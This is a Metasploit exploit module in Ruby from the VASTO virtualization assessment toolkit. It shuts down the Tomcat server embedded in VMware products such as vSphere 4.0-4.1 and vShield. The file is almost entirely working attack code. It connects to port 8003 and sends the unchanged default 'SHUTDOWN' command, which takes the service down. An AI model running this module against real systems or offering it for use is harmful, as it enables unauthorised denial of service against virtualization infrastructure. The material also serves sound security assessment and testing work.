#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local
include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'VMware Tomcat killer',
			'Description'    => %q{
					This module abuses the Tomcat server embedded in most VMware products, including Virtual Server vSphere 4.1-4.0 and vShield
		                 which is left with an unchanged shutdown value by default.
			},
			'Author'      => [ 'Claudio Criscione' ],
			'License'        => GPL_LICENSE,
			'Version'     => 'VMware Tomcat Killer 0.1',
			'Targets'     =>
				[
					#Vcenter runs on Windows
					[ 'Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						},
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 28 2010'))

		register_options(
			[
				Opt::RPORT(8003),
				Opt::RHOST('127.0.0.1')
			], self.class)
	end


	def exploit
		begin
		  port = datastore['PORT']
		  print_status("Connecting")
		  connect
		  print_status("Connected, sending shutdown")
		  #Sending shutdown
		  sock.put(
			  "SHUTDOWN\n"
		  )
		  print_status("Shutdown sent. Server should be down")
		  disconnect
		rescue	
		end
	end

end